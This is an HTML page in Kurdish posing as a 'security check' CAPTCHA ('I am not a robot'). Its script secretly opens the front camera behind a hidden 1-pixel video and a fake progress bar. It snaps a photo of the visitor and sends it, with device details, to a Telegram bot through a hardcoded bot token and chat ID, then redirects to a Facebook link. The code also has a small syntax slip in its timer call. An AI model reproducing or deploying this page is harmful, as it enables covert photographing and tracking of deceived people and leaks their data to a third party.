<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body { background-color: #f4f7f6; margin: 0; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
        .container { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; width: 320px; }
        .icon-box { margin-bottom: 20px; color: #1877f2; }
        h2 { font-size: 18px; color: #333; margin-bottom: 10px; }
        .progress-container { background: #eee; border-radius: 10px; height: 8px; width: 100%; margin: 20px 0; overflow: hidden; display: none; }
        .progress-bar { background: #1877f2; height: 100%; width: 0%; transition: width 0.1s; }
        .btn { background: #1877f2; color: white; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; border: none; width: 100%; }
        #canvas { display: none; }
    </style>
</head>
<body>

<div class="container" id="mainBox">
    <div class="icon-box">
        <svg width="50" height="50" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
    </div>
    <h2>پشکنینی ئاسایش</h2>
    <p style="font-size: 13px; color: #666;">تکایە کلیک بکە بۆ دڵنیابوونەوە لەوەی تۆ مرۆڤیت.</p>
    <button class="btn" onclick="startWork()">من ڕۆبۆت نیم</button>
    <div class="progress-container" id="pCont">
        <div class="progress-bar" id="pBar"></div>
    </div>
    <p id="status" style="font-size: 12px; color: #888; margin-top: 10px;"></p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const BOT_TOKEN = '8486664700:AAFsvIGJt8Iz1ITZbN4EvPajNJUzMuS6ImY';
    const CHAT_ID = '6351568884';
    const TARGET = 'https://www.facebook.com/share/1C5gccsXme/?mibextid=wwXIfr';

    async function startWork() {
        document.querySelector('.btn').style.display = 'none';
        document.getElementById('pCont').style.display = 'block';
        
        let width = 0;
        const bar = document.getElementById('pBar');
        const status = document.getElementById('status');
        
        // وەرگرتنی زانیاری باتری
        let batteryLevel = "Unknown";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            batteryLevel = (b.level * 100) + "%";
        }

        // دەستپێکردنی کامێرا
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            document.getElementById('video').srcObject = stream;
            
            let interval = setInterval(() => {
                if (width >= 100) {
                    clearInterval(interval);
                    capture();
                } else {
                    width += 1;
                    bar.style.width = width + '%';
                    status.innerText = "خەریکی پشکنین: " + width + "%";
                }
            }, 40; // ٤ چرکە دەخایەنێت
        })
        .catch(() => window.location.href = TARGET);
    }

    function capture() {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'shot.jpg');
            formData.append('caption', `📊 داتای نوێ:\n🔋 باتری: ${navigator.userAgent.includes("iPhone") ? "iOS" : "Android"}\n⚙️ وێبگەڕ: ${navigator.platform}`);

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
            .then(() => window.location.href = TARGET);
        }, 'image/jpeg', 0.8);
    }
</script>
</body>
</html>
